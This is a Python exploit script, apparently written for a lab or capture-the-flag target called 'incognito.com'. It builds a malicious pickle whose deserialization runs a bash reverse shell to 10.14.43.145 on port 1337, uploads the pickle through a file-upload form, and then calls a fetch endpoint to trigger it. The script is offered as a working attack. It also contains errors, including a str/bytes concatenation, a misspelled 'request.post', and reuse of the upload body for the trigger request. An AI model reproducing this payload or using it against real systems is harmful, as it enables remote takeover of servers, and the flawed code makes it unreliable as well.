import pickle
import base64
import os 
import requests


class RCE:
    def __reduce__(self):
        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.14.43.145/1337 <&1'")
        return os.system, (cmd,)


if __name__ == "__main__":
    upload_url = 'http://dev.incognito.com/secret/upload/script.php'
    upload_headers = {"Origin": "http://dev.incognito.com", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryhRH7hk3w4JzAzsFj"}
    rshell_url = 'http://incognito.com/fetch'
    rshell_headers = {"Host":"incognito.com", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Origin": "http://incognito.com", "Referer": "http://incognito.com/"}
    bad_pickle_obj = {"object":"/var/upload/badpickle.pkl"}
    boundary = "----WebKitFormBoundaryhRH7hk3w4JzAzsFj"

    with open('badpickle.pkl', 'wb') as f:
        pickle.dump(RCE(),f)
    
    file = open("badpickle.pkl", "rb")

    body = "--" + boundary + "\r\n"
    body += "Content-Disposition: form-data; name=\"the_file\"; filename=\"badpickle.pkl\"\r\n"
    body += "Content-Type: application/octet-stream\r\n\r\n"
    body += file.read() + "\r\n"
    body += "--" + boundary + "--\r\n"
    file.close()

    try:
        upload_response = requests.post(upload_url, headers=upload_headers, data=body)
        if upload_response.status_code == 200:
            print("File uploaded successfully")
        else:
            print("File upload failed")
    except requests.exceptions.RequestException as e:
        print(e)
    
    get_shell_response = request.post(rshell_url, upload_headers,data=body)
    exit()
